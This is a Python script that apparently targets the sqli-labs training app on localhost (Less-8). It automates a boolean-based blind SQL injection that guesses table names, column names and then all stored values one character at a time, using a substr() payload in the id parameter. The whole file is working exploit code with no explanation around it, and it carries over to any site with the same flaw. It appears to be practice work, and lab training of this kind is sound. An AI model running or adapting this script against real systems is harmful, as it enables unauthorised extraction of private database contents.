import string
import requests

s = requests.Session()
def exploit():
	url = "http://localhost/sqli-labs-php7/Less-8/"
	length=""
	payload = "s' or substr(({}),1,{})='{}'; -- -"

	# TO FIND LENGTH OF TABLES
	query = "select length(group_concat(table_name)) from information_schema.tables where table_schema=database()"
	for num in range(1,9):
		for char in "0123456789":
			brute = length+char
			r = s.get(url,params={"id":payload.format(query,num,brute)})
			if "You are in..........." in r.text:
				length = length+char
				break
	# TO DUMB ALL TABLES
	query = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
	tables=""
	for num in range(1,int(length)+1):
		for char in string.ascii_lowercase+string.ascii_uppercase+",_-@!01234567890}{#$%^&*()=+~`,.<>/?|\\[]:;\"\'":
			brute = tables+char
			r = s.get(url,params={"id":payload.format(query,num,brute)})
			if "You are in..........." in r.text:
				tables = tables+char
				break
	table_list = tables.split(",")
	print(table_list)
	# TO FIND LENGTH OF COLUMNS
	query = "select length(group_concat(column_name)) from information_schema.columns where table_schema=database()"
	length=""
	for num in range(1,9):
		for char in "0123456789":
			brute = length+char
			r = s.get(url,params={"id":payload.format(query,num,brute)})
			if "You are in..........." in r.text:
				length = length+char
				break
	#print(length)
	# TO DUMB ALL COLUMNS
	query = "select group_concat(column_name) from information_schema.columns where table_schema=database()"
	columns=""
	for num in range(1,int(length)+1):
		for char in string.ascii_lowercase+string.ascii_uppercase+",_-@!01234567890}{#$%^&*()=+~`,.<>/?|\\[]:;\"\'":
			brute = columns+char
			r = s.get(url,params={"id":payload.format(query,num,brute)})
			if "You are in..........." in r.text:
				columns = columns+char
				break
	column_list = columns.split(",")
	print(column_list)
	#TO PRINT EVERYTHING
	for table in table_list:
		for column in column_list:
			query = "select length(group_concat("+column+")) from "+table+""
			length=""
			for num in range(1,9):
				for char in "01234567890":
					brute = length+char
					r = s.get(url,params={"id":payload.format(query,num,brute)})
					if "You are in..........." in r.text:
						length = length+char
						break
			if(length == ""):
				length = "0"
			#print(length)
			query = "select group_concat("+column+") from "+table+""
			print(query)
			values=""
			for num in range(1,int(length)+1):
				for char in string.ascii_lowercase+string.ascii_uppercase+",_-@!01234567890}{#$%^&*()=+~`,.<>/?|\\[]:;\"\'":
					brute = values+char
					r = s.get(url,params={"id":payload.format(query,num,brute)})
					if "You are in..........." in r.text:
						values = values+char
						break
			print(values.split(","))

exploit()


	





